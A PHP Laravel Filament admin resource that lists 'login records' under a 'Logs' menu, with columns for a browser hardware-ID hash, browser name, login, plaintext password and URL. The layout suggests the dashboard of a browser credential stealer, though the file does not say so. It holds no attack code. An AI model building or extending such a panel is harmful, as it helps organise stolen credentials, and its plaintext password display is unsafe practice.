<?php

namespace App\Filament\Resources;

use App\Filament\Resources\LoginRecordResource\Pages;
use App\Filament\Resources\LoginRecordResource\RelationManagers;
use App\Models\LoginRecord;
use Filament\Forms;
use Filament\Resources\Form;
use Filament\Resources\Resource;
use Filament\Resources\Table;
use Filament\Tables;
use Illuminate\Database\Eloquent\Builder;
use Illuminate\Database\Eloquent\SoftDeletingScope;

class LoginRecordResource extends Resource
{
    protected static ?string $model = LoginRecord::class;
    protected static ?string $navigationGroup = 'Logs';
    protected static ?string $navigationIcon = 'heroicon-o-briefcase';

    public static function form(Form $form): Form
    {
        return $form
            ->schema([

            ]);
    }

    public static function table(Table $table): Table
    {
        return $table
            ->columns([
                Tables\Columns\TextColumn::make('browser.hwid.hash'),
                Tables\Columns\TextColumn::make('browser.name'),
                Tables\Columns\TextColumn::make('login'),
                Tables\Columns\TextColumn::make('password'),
                Tables\Columns\TextColumn::make('url'),
            ])
            ->filters([
                //
            ])
            ->actions([
                //Tables\Actions\EditAction::make(),
            ])
            ->bulkActions([
                Tables\Actions\DeleteBulkAction::make(),
            ]);
    }

    public static function getRelations(): array
    {
        return [
            //
        ];
    }

    public static function getPages(): array
    {
        return [
            'index' => Pages\ListLoginRecords::route('/'),
            //'create' => Pages\CreateLoginRecord::route('/create'),
            //'edit' => Pages\EditLoginRecord::route('/{record}/edit'),
        ];
    }
}
